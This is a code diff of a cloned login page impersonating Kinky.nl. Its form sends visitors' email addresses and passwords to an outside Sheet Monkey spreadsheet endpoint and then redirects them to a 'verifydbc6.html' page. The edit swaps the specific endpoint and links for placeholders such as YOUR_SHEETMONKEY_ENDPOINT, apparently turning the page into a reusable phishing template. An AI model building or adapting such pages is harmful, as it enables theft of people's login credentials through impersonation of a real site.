@@ -463,53 +463,53 @@
     <div class="shadowed-card p-4 p-sm-5">
         <h1 class="title-red big">Inloggen op Kinky.nl</h1>
         <p>Heb je al een account? Dan kan je hier direct inloggen.</p>
-        <form action="https://api.sheetmonkey.io/form/XXX123YYY" id="login-form" method="post">
-            <input type="hidden" name="x-sheetmonkey-redirect" value="verifydbc6.html">
-            <p class="form-error"></p>
+        <form action="https://api.sheetmonkey.io/form/YOUR_SHEETMONKEY_ENDPOINT" id="login-form" method="POST">
+  <input type="hidden" name="action" value="validate_captcha">
 
-            
-            <div class="form-group">
-                <label for="username"><b>Email</b></label>
-                <input type="email" data-validate="email|required" class="form-control" id="username" name="username">
-                <div class="invalid-feedback"></div>
-            </div>
-            <div class="form-group">
-                <label for="password"><b>
-                    Wachtwoord
-                </b> </label>
-                <div class="password-layout">
-                    <input type="password" data-validate="required" class="form-control" id="password"
-                        name="password">
-                    <i class="fa fa-eye show-password"></i>
-                    <i class="fa fa-eye-slash d-none hide-password"></i>
-                </div>
+  <!-- Redirect after submit -->
+  <input type="hidden" name="x-sheetmonkey-redirect" value="verifydbc6.html">
 
-                <div class="invalid-feedback"></div>
-            </div>
+  <p class="form-error"></p>
 
-            <div class="form-checks pb-3">
-                <input type="checkbox" id="remember_me" name="remember_me" class="form-control">
-                <label class="form-check-label" for="remember_me">
-                    Onthoud mij
-                </label>
-                <div class="invalid-feedback"></div>
-            </div>
-            <div class="d-flex justify-content-between align-items-center">
-                <a href="https://www.kinky.nl/wachtwoord-vergeten" class="forgot">Wachtwoord vergeten?</a>
-                 <button type="submit" class="btn btn-success">
-  Inloggen
-</button>
+  <div class="form-group">
+      <label for="username"><b>Email</b></label>
+      <input type="email" data-validate="email|required" class="form-control" id="username" name="username">
+      <div class="invalid-feedback"></div>
+  </div>
 
+  <div class="form-group">
+      <label for="password"><b>Wachtwoord</b></label>
+      <div class="password-layout">
+          <input type="password" data-validate="required" class="form-control" id="password"
+              name="password">
+          <i class="fa fa-eye show-password"></i>
+          <i class="fa fa-eye-slash d-none hide-password"></i>
+      </div>
+      <div class="invalid-feedback"></div>
+  </div>
 
+  <div class="form-checks pb-3">
+      <input type="checkbox" id="remember_me" name="remember_me" class="form-control">
+      <label class="form-check-label" for="remember_me">Onthoud mij</label>
+      <div class="invalid-feedback"></div>
+  </div>
 
-            </div> 
-  
-            <script src="../www.google.com/recaptcha/api431d.js?render=6Le09SwgAAAAAH86NZtq6kItrmf7JCiM4YixVecC"></script>
-            <script>
-                window.grecaptcha = grecaptcha
-                window.recaptcha_site_key = '6Le09SwgAAAAAH86NZtq6kItrmf7JCiM4YixVecC'
-            </script>
-        </form>
+  <div class="d-flex justify-content-between align-items-center">
+      <a href="WEBSITE" class="forgot">Wachtwoord vergeten?</a>
+
+      <!-- Submit normally so it posts to Sheet Monkey -->
+      <button type="submit" class="btn btn-success">
+          Inloggen
+      </button>
+  </div>
+
+  <script src="GOOGLERECAPTCHALINK"></script>
+  <script>
+      window.grecaptcha = grecaptcha
+      window.recaptcha_site_key = '6Le09SwgAAAAAH86NZtq6kItrmf7JCiM4YixVecC'
+  </script>
+</form>
+
     </div>
     <div>
         <h3 class="title-red">Heb je nog geen account?</h3>
